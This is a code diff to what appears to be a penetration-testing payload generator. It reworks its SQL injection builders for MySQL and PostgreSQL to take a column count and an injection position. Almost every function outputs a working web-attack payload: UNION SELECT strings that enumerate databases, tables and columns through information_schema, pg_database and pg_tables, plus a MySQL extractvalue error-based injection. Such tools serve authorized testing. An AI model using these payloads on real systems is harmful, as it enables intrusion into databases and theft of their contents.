@@ -6,105 +6,117 @@ Payload.SQLi = {
   },
 
   'MySQL': class {
-    static unionSelect (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static unionSelect ({ columns, position }) {
+      columns = parseInt(columns)
+      if (isNaN(columns) === true) {
         return ''
       }
 
       return 'union select ' +
-        Array.from(Array(value + 1).keys()).slice(1).join(',')
+        Array.from(Array(columns + 1).keys()).slice(1).join(',')
     }
 
-    static dumpDatabases (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpDatabases ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array.from(Array(value + 1).keys()).slice(1)
-      columns[(value === 1) ? 0 : 1] = 'group_concat(schema_name)'
+      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      fields[position - 1] = 'group_concat(schema_name)'
 
-      return 'union select ' + columns.join(',') +
+      return 'union select ' + fields.join(',') +
         ' from information_schema.schemata'
     }
 
-    static dumpTables (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpTables ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array.from(Array(value + 1).keys()).slice(1)
-      columns[(value === 1) ? 0 : 1] = 'group_concat(table_name)'
+      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      fields[position - 1] = 'group_concat(table_name)'
 
-      return 'union select ' + columns.join(',') +
+      return 'union select ' + fields.join(',') +
         ' from information_schema.tables where table_schema=database()'
     }
 
-    static dumpColumns (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpColumns ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array.from(Array(value + 1).keys()).slice(1)
-      columns[(value === 1) ? 0 : 1] = 'group_concat(column_name)'
+      let fields = Array.from(Array(columns + 1).keys()).slice(1)
+      fields[position - 1] = 'group_concat(column_name)'
 
-      return 'union select ' + columns.join(',') +
+      return 'union select ' + fields.join(',') +
         ' from information_schema.columns where table_schema=database()'
     }
 
-    static errorBased (value) {
+    static errorBased ({ columns, position }) {
       return 'extractvalue(0x0a,concat(0x0a,(select database())))'
     }
   },
 
   'PostgreSQL': class {
-    static unionSelect (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static unionSelect ({ columns, position }) {
+      columns = parseInt(columns)
+      if (isNaN(columns) === true) {
         return ''
       }
 
-      return 'union select ' + Array(value).fill('null').join(',')
+      return 'union select ' + Array(columns).fill('null').join(',')
     }
 
-    static dumpDatabases (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpDatabases ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array(value).fill('null')
-      columns[(value === 1) ? 0 : 1] = "string_agg(datname, ',')"
+      let fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(datname, ',')"
 
-      return 'union select ' + columns.join(',') + ' from pg_database'
+      return 'union select ' + fields.join(',') + ' from pg_database'
     }
 
-    static dumpTables (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpTables ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array(value).fill('null')
-      columns[(value === 1) ? 0 : 1] = "string_agg(tablename, ',')"
+      let fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(tablename, ',')"
 
-      return ' union select ' + columns.join(',') +
+      return ' union select ' + fields.join(',') +
         " from pg_tables where schemaname='public'"
     }
 
-    static dumpColumns (value) {
-      value = parseInt(value)
-      if (isNaN(value) === true) {
+    static dumpColumns ({ columns, position }) {
+      columns = parseInt(columns)
+      position = parseInt(position)
+      if (isNaN(columns) === true || isNaN(position) === true ||
+          position > columns) {
         return ''
       }
 
-      let columns = Array(value).fill('null')
-      columns[(value === 1) ? 0 : 1] = "string_agg(column_name, ',')"
+      let fields = Array(columns).fill('null')
+      fields[position - 1] = "string_agg(column_name, ',')"
 
-      return 'union select ' + columns.join(',') +
+      return 'union select ' + fields.join(',') +
         " from information_schema.columns where table_schema='public'"
     }
   }
